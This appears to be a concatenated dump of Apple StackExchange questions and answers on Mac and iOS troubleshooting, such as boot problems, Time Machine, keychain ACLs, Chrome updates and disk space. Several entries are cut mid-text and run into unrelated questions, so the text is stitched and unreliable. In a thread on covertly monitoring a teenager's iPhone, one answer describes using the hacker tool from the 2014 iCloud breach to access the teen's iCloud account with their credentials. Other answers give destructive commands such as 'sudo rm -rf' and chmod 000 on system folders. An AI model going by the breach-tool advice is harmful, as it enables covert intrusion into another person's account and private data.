then Ubuntu launches and crashes. I never see the Apple logo.\nWhen I insert the CD into the Mac at boot or before the boot, it keeps it a little time at boot, then ejects it.\nEDIT 1\nI have rebooted holding command-option-P-R. No display, the Mac makes THE sound, and auto-reboot.  \nThen I hold the option key: nothing happens, no image onscreen (power button of the screen is blinking), even if I wait 5 minutes. If I release the option key (alt on my PC keyboard, the Windows key should be the Command one), nothing more. If I then press the power button on the Mac, it shuts down instantly.\nIf I then reboot in a normal way, Ubuntu launches and crashes as usual.\nTIP : I use a Dell 27\" screen.\nEDIT 2\nI've burned a linux boot CD onto my W7 x64 PC (Ultimate Boot CD), inserted it into the booted Mac under crashed Ubuntu (no ejection of the CD, the drive tried to read things onto the CD), Hard reset, then kept the C key during boot. The CD drive did not tried to read the CD (no sound), and Ubuntu started/crashed as usual.\n\nA: You may need to separate the boot process from the CD reading.\nFirst, power off and reset the NVRAM by holding option + command + P + R\nThen, I would boot with the option key held until you have a grey screen. Once the Mac is at the boot chooser (no apple logo yet), you can then insert the CD.\nThis is firmware running the Mac, so you don't even need an internal HD to mount the CD. If it ejects, you need a repair of the drive or a replacement CD.\nIf the Mac can't boot to the boot chooser, then you have a hardware issue on the Mac.\n\nLooking over the further details, if your Mac can't boot to the grey screen then there is a hardware issue. It might be as simple as disconnecting a failing HDD or just reseating the HD cable. It also might just need you disconnecting every single peripheral and bringing a new keyboard to the hardware.\nI'd seek assistance from AppleCare or a hardware tech if you can't get the boot picker to show up. You could also see if your Mac supports internet recovery, but some 24 inch iMacs were made before that was added to the firmware.\n", "Q: iPod and iPhone iMessage inquiry Okay, so my iPhone and iPod are both connected therefore the iMessages that I receive on my iPhone are also sent to my iPod, but earlier by mistake I disconnected my iPod through my iPhone settings. Couple hours pass by and I just connected them again but I just wanted to know will the iMessages I received earlier ever go through to my iPod or will it only receive the iMessages from the time I re-connected?\n\nA: Normally, your iPod will load the previous messages. That's from my experience... \n", "Q: Where do files go when you AirDrop them on iOS? Where do AirDrop files go when I transfer them between an iPad, iPhone and iPod? I AirDropped some Google Docs from my iPad to my iPhone but nothing happened; where did my files go? The file was a list of tools.\n\nA: On iOS, AirDropped files open immediately and automatically in the app registered to handle them via AirDrop. If no such app exists, those files simply disappear.\nTypically, if you AirDrop a document using one app, you’ll want to have the same app installed on the receiving iOS device.\n\nA: I Found them... check your downloads folder!\n", "Q: Cellular Data Annoying Popup with ios8 Ever since I updated my iPad Air to iOS 8, I've been getting constant reminders for the setup cellular data plan. I bought the iPad with the SIM chip just in case I wanted to get data for it, but have so far decided that I don't need it. This popup still comes up even when I go into settings and turn cellular data off. Has anyone else had this problem since upgrading to iOS 8?\n\nA: Disable cellular data in settings. If you haven't activated a plan with a carrier yet, there's no option in settings to disable cellular data.\nAs a workaround, you can tell Siri \"Turn off cellular data\" to disable the setting and you should no longer get the message.\n\nA: Problem solved!     Turn off blue tooth!    I thought only cellular data needed to be turned off but Bluetooth needs to be turned off as well.   After 2 months of annoying pop ups the  problem resolved when I turned off Bluetooth!   It is amazing apple support did not mention this.  \n", "Q: How to display USA content on my AppleTV while I'm in Mexico using hotel wifi? How can I display USA content on my Apple TV while I'm in Mexico using a hotel's wifi?\n(I've been told that AppleTV may only show Mexican content while I'm in Mexico.)\n\nA: Try Unlocator. It is a service to make it look like you are somewhere other than where you are. They have a seven-day trial so you can see if it does what you need. I'm not affiliated with the company, just a satisfied customer.\n\nA: You can attempt to use (manually configure in networking) a DNS server(s) that are hosted in the US. One possibility is to make note of your ISP's DNS server IP addresses when you're at home and then manually configure those when abroad.\n", "Q: Setting a different picture for each Messages account I have recently retired Adium in favor of Apple's own Messages app, because it makes my life easier in some ways (especially ever since getting an iPhone). However, there is one feature that Adium had which Messages apparently does not - the ability to set a different user icon on each account.\nI like having some of my accounts have a different picture for various reasons (for example, having a more professional icon on my work account and a more fun one on my personal account); is there any way to get this functionality back, without having to use both Adium and Messages?\n\nA: I've researched it a bit and tinkered with the messages application myself because I too use multiple accounts and thought a different picture would actually be great for my uses.\nHowever to my disappointment, this isn't a possibility. You can only change your account picture as a one-for-everything picture in Messages -> Change My Picture... which is a shame really.\n", "Q: How do I configure my browsers not to save passwords for specific websites? There are certain web sites whose passwords I don't want saved, for security reasons. I want to type them in manually whenever needed.\nHow do I configure Safari, Chrome and Firefox on Mavericks to not save passwords for these web sites, and not to ask me?\nI don't want my browsers to ask me whether to remember the password for these web sites, because I can (and have) selected Yes without thinking, say when I'm in a hurry.\n\nA: Since you have multiple questions here, I would attempt to answer one of them:\nIn case of Firefox:\nOpen the permissions manager\nin the address bar type following about:permissions and hit enter\nIn the new window select the web site to work on and choose the settings.\n\nTo further customize a specific web site (fine tune) click on the small Icon in front of that website address. In the new pop up window you can highly customize what that web site can and can not do.\n\nA: On your iOS an Android devices you can use an app that will manage the passwords and log in for you. These apps clear up the cache and store the passwords in a secure manager. You can lock them with a password as well.\nI'm using LoginBox, which I found to be the best solution around.\n", "Q: Search all archived mails in the server in Apple Mail for OSX Mavericks I'm using Apple Mail on OSX Mavericks, with an IMAP account configured (Google).\nSince all my mails are archived on the server (I'm using Apple Mail just from a few months), when I search emails, I need to retrieve all the emails stored on Google servers.\nInstead, I can only retrieve recent emails, while on my iPhone (Mail app) the search is distributed on the server.\nHow can I apply a distributed search also on my Mac? Is it possible?\nI also tried to enable the (translated to english) \"Do not limit the number of messages in IMAP folders\" option on Gmail, but after some time Mail on OSX shows me an empty inbox and only a few mails in my folders.\n\nA: I can confirm that the IOS 8 Mail app (and on IOS 7) searches all IMAP mailboxes on all 5 of my mail accounts on different servers when I use the search box via the \"All Mailboxes\" list item in IOS Mail. It can take a little while sometimes but it always works for me. \nIn Mavericks Mac Mail I leave the Inbox selected when I search otherwise it seems to search only the selected mailbox.  \nIn the case of Gmail Archived mail it must depend upon how Google has implemented their Archive mailbox. But if it is a regular IMAP mailbox, your search will include its contents. \n", "Q: Trying to trace Iphone I lost my iphone5 a few minutes ago. I have activated my FindmyIphone. But since the phone is off it is not being traced. Also I have a 4 digit passcode installed to unlock the phone. Is it possible that the phone can be misused in this case. Also what is the likelihood of finding it through FindmyIphone and IMEI registration, I have registered on both. \n\nA: From Apple:\n\nIf you have already configured the iCloud Find My iPhone service on\n  your iPhone, iPad, iPod touch, or Mac you can use it to locate your\n  missing device, display a message on its screen, make it play a sound\n  at full volume (even if on mute), remotely lock it, or remotely wipe\n  (erase) it to protect your privacy. Please see the following articles\n  for more information:\n\nThe phone is pretty much useless to who ever found it.\nBut consider following as first step:\nI just found your phone and it is locked and I have no idea to who it belongs, so there is not much I can do to return it. I could go to police station (but who has time to do that).\nIf you are so kind you would send a message to your phone with your contact information, email or phone number, I would contact you to arrange the return.\n\nA: Presuming you were running iOS 7, and enabled Find My iPhone, it is worth nothing to the person who found it.  They will be able to wipe it, however they won't be able to activate it unless they have your Apple ID and password.\n", "Q: Can i make my iPad stop autocapitalizing the word \"i\"? If you look at my profile, you can see that i ask people not to capitalize the word \"i\" in the middle of a sentence. Now, ignoring whether or not this is a good idea, can i make my iPad not autocorrect a lowercase i to a capital one?\n\nA: It turns out that by writing \"i\" enough times, the iPad eventually caught on and lets me write the way i want to. I just have to tap the \"i\" in the keyboard suggestions for a few times, and it seemed to add it to the dictionary.\nIn fact, while writing this post, i accidentally hit j instead of i and it autocorrected to \"i\" for me.\n\nA: There's not a fix I know of, but there's a workaround.\nPrefs > General > Keyboards > Shortcuts.\nHit the + & add\nPhrase i\nShortcut ii\nIt won't accept anything less than a 2-character shortcut, but I'm sure it will take no time at all to remember to type ii for i.\n[now to stop mine doing it... grrr] \n", "Q: OSX 10.9.5 cancel Finder operation causes dialog to never finish Whenever I cancel a Finder operation (e.g. Duplicate), the progress window that pops up never finishes.\nThe Blue/White progress is animated, the X is of course disabled, and it says \"Stopping\" under the progress bar.

I'm currently working on an iOS application which almost started from scratch (And I did also as I didn't work on iOS before that).\nMy question is : Now that we have iOS8 that is to replace iOS7 and iPhone6 should I bother make my display compatible with iPhone 4 ?\nI've try to look for statistics on the web but I wasn't very lucky and couldn't find any numbers to help me take a decision... What is really frustrating is that some of the very useful library don't work on iOS8 (or at least not like they're supposed to...) But work like charme on iOS7.\nIf anyone has some knowledge to share... More than welcome !\nThanks\n\nA: You're going to run into trouble if you try to make your application code device-specific. The correct way to approach a software release is to target OS-compatibility. That means that if you're going to go for a minimum of iOS 7, you need to ensure that your software is compatible with all the devices that are able to run that iOS version. Anything else opens you up to a whole world of hurt. App Store does NOT define system requirements by device model.\n", "Q: How do I move my Health data from one device to another? I just got an iPhone 6+ and I want to move my Health data from my iPhone 5. I know I can export it, but I don't see any importation options in Health. How do I move all this data?\n\nA: iCloud will back up your health data on your iPhone so you can restore your health data to a new device or to your device if it fails or needs to be wiped. \nIf you don’t use iCloud, iTunes also backs up health data but only if you select \"Encrypt iPhone Backup\".\nWhen you do a \"Restore from Backup\" on your iPhone 6, select the encrypted backup you just made. Your health data will then come across along with all other backed up data. \nIf you do not encrypt your backup (as I did) and you have already \"moved on\" with your iPhone 6 with new apps and data, well then, that is another question that I am trying to find the answer to, as the above will not help you much.\nSee http://support.apple.com/en-us/ht5262\n", "Q: Error while installing Mavericks in a clean hard drive I've decided to reistall osx Mavericks on my MacBook, so I restarted my Mac clicking cmd ⌘+R.

I have bought my new macbook pro retina 15 inch so i am not aware about few things. If i upgrade from Mountain Lion to Yosemite will I loose all my installed softwares? Data? \nEven if loose those installed softwares, no worries. I can re-install them. I have the .dmg files. But what i am worrying is, will these old softwares for M.Lion work with Yosemite? Or i need to update them all.  \n\nA: The system is clearly designed to take great pains to not lose your data, however whenever you rewrite the core part of the OS that is responsible for booting the system, that is the time when you are most likely to discover a problem:\n\n\n*\n\n*Your hard drive or hardware could be flakey and the volume of changes exposes a pre-existing problem that was un-noticed since it was only affecting non-vital files.\n\n*Your unique set of software and settings has a bad effect when migrated to the new OS.\n\n*Your apps you depend upon don't work well yet or ever with the new OS.\n\n*Your command line tools might all get deactivated / moved so it really depends upon which package manager you use and how ready it is to use the new versions of the compiler tools from Yosemite. I would ask a second question with specific details if you want to research that aspect of the upgrade to 10.10.\n\n\nIf you don't have the time to back up fully and have tested your restore process, you might be better doing that and not upgrading to a new OS before upgrading. Or you can check the availability of help to assist in the very unlikely chance you have an issue and pay someone / recruit someone to help you over the bumps.\n\nA: You won't loose anything that isn't part of the system. \nAFAIK, what worked on Mountain Lion/Mavericks is most likely to work on Yosemite. If you have some critical software you need, you might want to check for some feedback from other users who have done the upgrade. \nFor a packet-management tools there is Homebrew or Macports. \n", "Q: TimeMachine Keychain backup Does timemachine backup all keychain access keys for xcode security?  Or does that need to me configured to work correctly?\nWe want to back up a IOS App build machine.\n\nA: All keychain files on the system get backed up to Time Machine.\nThey are of course each encrypted by different keys for different users so once you restore them, you may or may not be able to get into them as long as you remember the appropriate passwords. Do note that when you reset the password of an account using admin tools (or bringing the keychain to a different OS) - the keychain password is preserved to protect the contents. You really need to use the original password to unlock the files.\nI've had no issues backing up Xcode and Xcode server using Time Machine.

If not then I'm going to have to start fresh with a new back-up, but that will take days to get up to date again!\n[edit]\nI've just tried using tmutil associatedisk -a and tmutil inheritbackup to no avail, after an even longer deep scan it just starts trying to discard old backups again.\n\nA: It turns out my particular problem wasn't covered by other, similar cases, so I'm going to post my own answer describing the actual issue I had, and the solution I found to it.\nIn my case it appears that somehow my last \"complete\" Time Machine backup was in fact corrupted somehow; when I looked inside it I found that the contents of my user folder were missing, so Time Machine was in fact correct in thinking that it needed to backup everything from my user folder again.\nTo solve this I needed to delete the last \"complete\" backup on my Time Machine drive. To do this I opened my Time Machine volume in the Finder, and navigated inside the Backups.backupdb folder, my computer name and then found the folder with the most recent time and date. After taking a quick look at some of the largest folders I saw that my user folder (the biggest on my system) was empty.\nTo fix this problem I then ran the following command in Terminal:\nsudo tmutil delete \"/Volumes/Time Machine Backup/Backups.backupdb/MyComputer/2014-10-01-175432\"\n\nOf course you will need to replace the part in quotes with the correct path to the corrupted backup. You can also do this easily by instead typing sudo tmutil delete (with trailing space at the end) and then dragging the folder onto the Terminal window to have it add the path for you (it may include backslashes, this is normal). You'll need to run this command using an administrator account and enter its password, since only an administrator can alter Time Machine's backups.\nFor anyone experiencing a similar issue to what I was seeing, I would now highly recommend giving your latest backup a quick check to make sure that you aren't experiencing the same problem I was; although the chances of this corruption occurring seems extremely low (Time Machine would have to be forcibly interrupted or crash for it to occur, though having your Time Machine volume disconnect may do it), it doesn't take long to give your latest backup a quick check, but it can save you a lot of time before you go ahead and try other possible solutions.\nIf you aren't experiencing the same problem I did then I recommend trying the following links:\n\n\n*\n\n*Time machine wants to backup too much\n\n*TM is doing a full backup for no good reason\n\n*My backups seem too large\n", "Q: How play a YouTube video in the background on an iPad?

What do Apple technicians actually change when they take the iPhone 5 for repairing the sleep-wake button issue? Do they just replace the outer button or something else too? \nWhat parts are actually replaced with new ones?\n\nA: I replaced this myself and it's very tedious and time consuming.   There is a ribbon cable in the phone that connects all of the exterior buttons/switches to the motherboard.  Usually the physical button you see from the exterior of the phone is not the problem, it's either the tiny button that button presses (attached to the end of the ribbon cable) or something with the wires themselves within the ribbon cable.\nIn case you're curious, here are instructions for how to do it yourself and what the inside looks like but I'd advise against doing it yourself unless you have experience with this sort of thing, a lot of time to kill, the phone is already out of warranty, and you could go without use of the device you're repairing.\nThe $5 cable I bought on Amazon worked for a few months but started to fail itself.  I'd recommend paying to have Apple do it.\n\nA: The device is sent back to Apple (repair facility) and they replace a metal diaphragm and flat cable that runs along the side/top of the inside of the iPhone. The reason it's not repaired at the Apple Store the techs aren't trained to take the entire iPhone apart like the factory repair center. Also its to time consuming. \nSome Apple store actually have a \"shim\" that they push into a space when the metal diaphragm has to much space to contact the sleep wake button. Most of the time the shim doesn't work. \n", "Q: how can I configure a mac to modify parent directory timestamps when programs touch files I would prefer to have all parent directories timestamps modified when a file is modified by any program.  Is this possible on a mac?\nBasically, for huge build systems with 100 directories, we would only have to scan 100 directories and dig down recursively into a very small subset of changes to create a very fast efficient build.  This could bring build times from 10 minutes down to 2 minutes.\nIs something like this even possible?\nthanks,\nDean\n\nA: You should be able to use git-hooks with a post-commit trigger to read the push logs and then execute a shell script to touch your parent directory (or directories, if you wish to work up the tree). The push logs should contain all the modified files, so you can parse that information and touch the dirs accordingly.\nThis article may shed further light:\nhttps://superuser.com/questions/740026/how-to-run-a-shell-script-on-git-commit\nI hope it helps you to arrive at an efficient solution.\n", "Q: Find my phone issue I think it is crazy on this option to send an email everytime.  This feature was added so if you lost your phone it could be found but it is also a good tool to check on your children or (spouse).  I do not like that it sends my child an email everytime I check it.  That should be parental control.  Makes you want to get an android that doesn't notify the person their phone was checked up on.\n\nA: Find My iPhone helps you locate and protect your iPhone, iPad, iPod touch, or Mac if it’s ever lost or stolen.

Only opens winmail.dat As soon as I downloaded IOS 8.0.2 I'm no longer able to read emails correctly… My staff send me email and I'm receiving pictures as winmail.dat and they're jpeg.\n\nA: This is a symptom of Outlook sending incorrect formats to Internet-based e-mail addresses. It's been a problem for many years. Have your IT staff look into the problem here:\nhttps://support.microsoft.com/kb/958012\nIf you're the only one who is receiving these wonky mails, it could be that your entry in Contacts is forcing the supposedly not an RTF problem to be exactly an RTF problem. It can be checked in Outlook:\n\n\n*\n\n*Open that specific contact by double clicking the item in the Contacts folder.\n\n*Hover on the email address of the contact and an Address Card pop-up will become visible.\n\n*On the right side of the contact card you’ll see a menu button. Click on it and from the list choose; Outlook Properties.\n\n*Make sure that the “Internet format” is set to “Let Outlook decide the best sending format”.\n\n\nLet us know how you get on with it. It can be a pesky problem to sort out.\n\nA: I tend to believe this answer is incorrect, or at least not fully correct.\nThe problematic Outlook settings have been known for years. However, the OP stated that the problem started after upgrading to iOS 8.0.2, which implies it worked before, without any settings changed on the senders' side.\nI am experiencing a similar issue. iOS 8 devices cannot receive emails sent from my Outlook account. However, an older iPhone 3GS on iOS 4 receives them just fine, as do a few Android-based phones.\nI verified that my Outlook is configured to send HTML (not RTF) to internet addresses. Granted, it's possible that the Exchange overrides this and forces RTF. However the fact that it works on older iOS versions indicates that something did break on the receiver side.\nEdit: Having done some more research, I would like to retract my statement. At least in my case, in the end it did turn out to be a sender (Outlook) problem, but a tricky one, as follows:\nIf a contact is in the auto-complete cache, Outlook will retain the original settings for that contact, even if the global settings are changed (reference). I changed those settings a long time ago, so all new contacts had no problem, but some of the old ones which were cached were still receiving RTF formatting. The iOS version was just an unrelated coincidence.\nRemoving the contacts from the Outlook cache (pressing the little X next to the contact name) fixed the issue.\n", "Q: OS X mavericks update issue am trying to update my iMac 21.5 inch mid 2010 from os x mavericks 10.9.1 to 10.9.5 to work on Xcode 6 but it always fail and give me the alert message OS X Update could not be verified .

That is according to this Apple article:\nhttp://support.apple.com/kb/HT5942?viewlocale=en_US&locale=en_US\nInstalling Windows graphics drivers in OS X is not supported. Attempting to do so may render OS X unusable and is ill-advised.\n\nA: OpenGL 2.1 is Apple's legacy context. You need to request a core context for the system you intend to use, though, as you've discovered, XQuartz will only do legacy. \nIf you install Windows via Bootcamp & install the latest NVidia drivers for Windows, you will see the highest context your card can support, possibly 3.3 but may even be 4.2 [I don't have a Mac with NVidia to test, but my ATI HD 5770 can achieve 4.2 under Windows.]\nThis may be of assistance, even though it isn't marked as Answered - OpenGL 4.1(?) under Mavericks\n", "Q: Covertly monitoring teen's iPhone My friend has an at-risk teen and the child's counselor as asked her to monitor his online activities without his knowledge.  Since I'm a \"computer guy\" she asked me for guidance.  But most of the solutions I'm finding are require jailbreaking his phone and I don't feel comfortable doing this (for a list of reasons).\nIs there an Apple-supported way of installing covert tracking software on an iPhone in order to monitor a child's device?  I thought of doing this at the router instead, but of course SSL defeats a lot of this and routers won't catch 3G/4G traffic so I feel it has to be done on the device itself.\n\nA: You could try installing the Prey ( https://preyproject.com/) which allows you to track the phone but this would involve installing the application on the target phone. \nI don't think there is a Apple-supported way to monitor the online activities as such. \n\nA: You could set up family sharing so you will have to give permission before any apps are downloaded.when using the same apple id for iCloud, the browser history from safari of the child will also be available for the parent.\n\nA: After looking into this pretty thoroughly, I think the only non-jailbreak method involves using iCloud (which is pretty good, though not foolproof).\nYou can buy all kinds of products that will parse your iCloud store from apple and give it to you in a nice format.  For $99.  Apple itself doesn't sell such a product, so you're left with buying sketchy software from China to do it. :(\nMy approach: I downloaded the hacker tool used in the iCloud breach from Summer 2014 and used that to access iCloud.  Of course, I did a hand-audit of this code before trusting it (it's in python, so easy to read).  I extended it a little to make it easier to use and make it look nicer, but the guts are the same... you just need the iCloud acct name and password.\nAnything else, you need a jailbreak.  The iOS 8 jailbreak is currently ill-understood by the community and seems quite risky to use.  Plus all the other bad things that go along with a jailbreak.\n", "Q: iPhone 4s: I keep receiving notifications over 3G for apps that I've disabled cell data for I try and keep an eye on my cell data so I don't use too much. From what I've noticed from my own usage the apps that eat up the most data are the ones that stream music and videos like Pandora and Youtube, so I turned off cell data for these apps. Just yesterday I got a notification from Pandora saying \"New music has been added to so-and-so station\". I wasn't on wifi and after double checking the cell settings data was still disabled for it. \nWhats going on?\n\nA: When you disable access for cellular data for specific apps like Pandora and YouTube, It only disables the access cellular data when you have the application open.\nThe push notifications you receive on your iPhone are sent through the Apple Push Notification Service (APNS). This is done so that the application does not need to run at the background to fetch new notifications all the time, Only the Apple's push notification service runs all the time checking for updates from all the applications.\nAll the more the push notifications uses a very minimal amount of data which won't be shown in the usage.\n", "Q: Passcode lock feature to prevent iPhone from being turned off I have a teenage daughter who is making really poor decisions, I was able to keep track of her location until she learned to turn off her phone while she doesn't want to be found.

Recently replaced stock video board because I wasn't getting any video output. Any ideas on what might be wrong and how I can fix it?\n\nA: It seems that you're seeing two problems simultaneously: video corruption and a software error returned by your antivirus application. This suggests that the system has possible hardware issues. I would boot the system to the Apple Hardware Test and run diagnostics to see whether there is a hardware failure. Video corruption is often traceable to a bad GPU and/or bad RAM. Since you replaced the video card, the bad GPU is unlikely.\nIf AHT returns errors, you may wish to take the system into a Genius Bar or authorized Apple repair centre for further evaluation. If not, you may have a transient issue. You can try swapping around/removing RAM to determine if one or more of your SO-DIMMs have gone bad.\n", "Q: apple macbook pro screen doesn't comeback if we hit a key instantly after it goes to sleep I just got a Macbook pro 2014 old retina version.

Its really annoying because I want  stop it from sleeping because I want to do my office work I expect it return from sleep vey quickly\n\nA: If the screen is going off at the same time that the system is sleeping, you're likely seeing a delay from the system writing its hibernation files. By default, OS X sets up sleep such that if power fails, the system can restore itself when it's plugged in again.\nGenerally, I advise against this, but if you wish to experiment with disabling hibernation, use the following command in Terminal:\nsudo pmset -a hibernatemode 0\nYou can restore the normal hibernation mode setting with:\nsudo pmset -a hibernatemode 1\nIf your HDD is low on free space, writing large files will be very slow because of extreme fragmentation. Freeing up disk space can make a significant improvement in performance.\nEdited to add:\nA workaround for this may be to set your screensaver/display sleep time to be earlier than your system sleep time. Even if it's only by a minute or two, it will change the dynamics of your interaction with the system.\n", "Q: I have a Safari publicity issue?

You don't need to remove or mangle any files you have on your system.\nYou should set check interval to zero like this:\ndefaults write com.google.Keystone.Agent checkInterval 0\nAfter you done you can update google products from command line or Finder by running CheckForUpdatesNow.command command which can be found in one of following locations:\n\n\n*\n\n*/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/\n\n*~/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/\n\n\nA: The \"official\" Google-given method given is this, but it doesn't always work. The updater sometimes, on some systems, finds a way to reset itself and update anyway.\nIn Terminal: \ndefaults write com.google.Keystone.Agent checkInterval 0\n\nThe most foolproof method is to deny Chrome the permissions it needs to install the update software and run it. Empty these directories:\n/Library/Google/GoogleSoftwareUpdate/\n~/Library/Google/GoogleSoftwareUpdate/\n\nThen change the permissions on both folders named GoogleSoftwareUpdate so that there's no owner and no read/write/execute permissions.\nIn terminal:\ncd /Library/Google/\nsudo chown nobody:nogroup GoogleSoftwareUpdate\nsudo chmod 000 GoogleSoftwareUpdate\ncd ~/Library/Google/\nsudo chown nobody:nogroup GoogleSoftwareUpdate\nsudo chmod 000 GoogleSoftwareUpdate\n\nIf you want to be double-certain, then do the same for the folder Google one level up.\ncd /Library/\nsudo chown nobody:nogroup Google\nsudo chmod 000 Google\ncd ~/Library/\nsudo chown nobody:nogroup Google\nsudo chmod 000 Google\n\nI did this immediately after installing the Chrome version I need for my machine, and it worked perfectly.

I'm importing my digital ID (X.509 certificate and private key for signing, verifying, encrypting, and decrypting messages) into the keychain.  In the GUI I see my certificate and the corresponding key and I can modify their descriptions and can write a note describing their usage, etc.\nHowever, when Mail.app tries to get access to the private key it displays a dialog window saying 'Mail wants to use your confidential information stored in \"privateKey\" in your keychain.'.\nNow, I have multiple digital IDs for different addresses, so that message doesn't give me any idea which key it tries to access.  I investigated a bit and it turned out that when you import a key an ACL list is also created inside the keychain.  Each item in that ACL list has an optional description.  I believe that when there is no description defined it the mentioned dialog will use key's description, but if there is an ACL description it will be used instead.\nWhen I dump my keychain with \"security dump-keychain -a\" I'm getting the following:\nkeychain: \"/Users/galaxy/Library/Keychains/login.keychain\"\nclass: 0x00000010\nattributes:\n    0x00000000 <uint32>=0x00000010\n    0x00000001 <blob>=0x646[...]00  \"galaxy@domain.tld\\000\"\n    0x00000002 <blob>=<NULL>\n[...]\n    0x0000001A <uint32>=0x00000001\naccess: 3 entries\n    entry 0:\n        authorizations (1): encrypt\n        don't-require-password\n        description: privateKey\n        applications: <null>\n    entry 1:\n        authorizations (6): decrypt derive export_clear export_wrapped mac sign\n        don't-require-password\n        description: privateKey\n        applications (0):\n    entry 2:\n        authorizations (1): change_acl\n        don't-require-password\n        description: privateKey\n        applications (0):\n\nFirst of all, I want to change the description from \"privateKey\" to \"galaxy@domain.tld (Encryption)\" for ACL entry 0.  I searched a lot, but so far I found only references to OS X API to do so.  Is there a tool to do that?  If there is no such tool, how can I set it up at the time of the import?  I'm asking since when StartSSL automatically forces Safari to import the digital ID the ACL description is set to 'www.startssl.com', so I know that it's possible to set it up.\nFinally, a bonus question is there is a tool or a way to customise ACLs?  For example I want to drop export_* from entry 1's ACL (I've also seen that done by StartSSL with their digital IDs).\nUPDATE: Since Apple has released their Keychain Access GUI as Open Source I checked the sources for the PKCS#12 import and there they do have an option to set the description and ACLs up at the time of the import.  However, I never coded anything for OS X and it hard to figure out what condition should be met to get the description of ACLs and ACLs themselves right at the time of the import.  The logic is located in the Security package in pkcs12Crypto.cpp:\n[galaxy@home:~/xcode/Security-55471.14.18/libsecurity_pkcs12/lib]$ grep -B5 -A5 '\"privateKey\"' pkcs12Crypto.cpp\n        try {\n            CssmClient::KeyAclBearer bearer(\n                cspHand, *privKey, Allocator::standard());\n            SecPointer<KeychainCore::Access> initialAccess(access ?\n                KeychainCore::Access::required(access) :        /* caller-supplied */\n                new KeychainCore::Access(\"privateKey\"));        /* default */\n            initialAccess->setAccess(bearer, maker);\n        }\n        catch (const CssmError &e) {\n            /* not implemented means we're talking to the CSP which does\n             * not implement ACLs */\n\nUnfortunately in all my import attempts I'm still hitting that hardcoded \"privateKey\" description and when I have, say, 5 different digital IDs they all request access with \"privateKey\" in the dialog and it's confusing.\n\nA: After quite a tedious research it seems that there is no easy way to edit the description of the private key, so basically unless Apple enhances their Keychain Access application there is no way to distinguish between multiple digital IDs imported into the same key chain.\nIt also looks like Google Chrome (and Chromium) have implemented some key management routines and are managing the descriptions of imported private keys.  However, I didn't figure out exactly how to leverage this functionality yet.\nAnyway, the short answer to my question: there is no way to modify item's ACL and/or their descriptions in OS X keychain at the moment and it seems that nobody really cares.\n\nA: By chance I stumbled on to a fix (of sorts) for the problem of \"privateKey\" being displayed in the mail dialogs and confusing a ...\n\nway to distinguish between multiple digital IDs imported into the same key chain.\n\nThis is not such an elegant solution and I don't understand why it works, but after much testing, in multiple mail clients, under both OS X 10.10.3 and 10.10.4, I have found that it does work, it's easy, and it works every time. In a nutshell, you basically just drag the digital IDs to a new keychain and then turn around and drag them back. \nHelpful details and lessons learned are as follows:\n\n\n*\n\n*Applicable to digital IDs in the login keychain. Other keychains not tested.\n\n*Using an existing system keychain as the intermediary didn't work.\n\n*New keychains require a password of at least six characters but of any strength.\n\n*Beware passwords for new keychains are not saved on any other keychain!\n\n*Default Lock Settings for new keychains are an annoying 5 minutes and Sleep.\n\n*On drag (or paste) of ID, Private Key Access Control faults to Allow all applications access to this item. Manually go in and change it back to Confirm before allowing access.\n\n*Just leaving the IDs in the new keychain and using them there may not be practical since new keychains don't unlock on login.\n\n*On delete the new keychain best to select the non-default option Delete References & Files.\n\n*Subsequent edits of private key name require another \"fix\" to effect the changes.\n\n", "Q: Lock Screen Keyboard I just upgraded to iOS 8.0.2. Now there is a permanent keyboard on the lower half of my screen in locked mode and on home screen.

Enter your lock screen password. Swipe down there are radio buttons under a heading that reads Allow access when locked. The last one is Reply with message. Try turning that one off.\nIf problem persists and you want an annoying non(long-term)solution, you can swipe right directly on the lock screen text to get a reply square. Selecting this will allow you to close out of the lock screen text and give you full access to the password entry screen so that you don't have to restart your phone.\n\nA: I've had this issue as well when using a Bluetooth keyboard with my iPad Air (iOS 8.0.2). \nAs soon as I disconnect the keyboard, the software keyboard will pop up on screen, regardless whether the context allows text entry. \nThe keyboard responds to input (key press), but even when having an application such as Notes open, typing doesn't do anything. I've noticed that when you split the keyboard in two, it will actually reveal a second keyboard behind it for a split second.\nThe only workaround I've found is to hard reset the iPad by holding both the home button and the lock button for ten seconds (until the Apple logo appears). After that, the permanent on-screen keyboard disappears.\n", "Q: Can I delete the contents of some TextEdit Documents (60 GB)? (and how?) I recently noticed that there's only 60 GB of my 250 GB Macbook Pro diskspace left. I have been using it for only a few months and have only a few applications installed.\nDisk Inventory X showed me that there are about 80000 textEdit Documents with 62 GB on my Mac. The Preview Document Category shows 18 GB.\nAre these necessary?\nI regularly use Cleaner and delete things manually.\nCan I delete some of these contents without doing harm to the system?\nI really need to clear some space and have no idea where all that diskspace went...\nThanks for your help, much appreciated!\n\nA: It depends on where they are located and what the contents are. I use DaisyDisk when I have disk space issues on my macbook pro. Disk Inventory X sounds like a similar program. With DaisyDisk you can see what and where the files are located that are taking up so much space. You can download and use the free trial version of DaisyDisk from http://www.daisydiskapp.com/.\nMaybe that will allow you to navigate to some of the files taking up so much space so that you can open some of them up to see if they are important or not.\n\nAs for how to remove the files:\n\nOnce you know the location of the files you can easily remove them from terminal. Just run the following command in terminal.app:\nsudo rm -rf /Path/To/FolderToDelete/\n\nThat command will remove the FolderToDelete folder and all files inside of it.\nBe careful with sudo command. See comments below.\n\nA: In general, anything visibly stored inside your own User directory is fair game to delete if you no longer want it.\nI say visibly because the Library folder in your User directory has some file that are safe to delete and others that may have unintended, nasty consequences.\nFinally, some Applications and Applications bundles do contain stuff that you could delete safely, but, like the Library folder, it may be best to leave alone just in case.\nBTW, unlike the suggestion below, I'd avoid using the rm command unless you know exactly what you are doing. Just drag the files you no longer want/need to the trash and empty it.\n", "Q: Unlocking iPad 2 (iOS 7) with the Apple ID credentials Someone set a passcode to my iPad, and he can't remember what it is. Now I can't open it, I'm always asked for 4-digit passcode. But, I do know my Apple ID credentials, and my iPad is connected to my Apple Account. \nI know that in Android based devices there is an option to skip the passcode screen using the Google Account of the device, but I can't find similar way in my iPad.\nIs there a way?\n\nA: Sorry, but there is no way to bypass a forgotten password. You must restore it in iTunes. If your device is backed up in iCloud or iTunes, you can restore your data.\niOS: Forgot passcode or device disabled\n", "Q: iPhone backup or sync issue \"unknown error occurred (-50)\" I recently switched from iCloud backup to backing up to my computer since the iOS 8 update seems to have doubled the size of my backup and it no longer fits on iCloud. \nWhen backing up to my computer by pushing \"Back Up Now\" in iTunes, I get an error 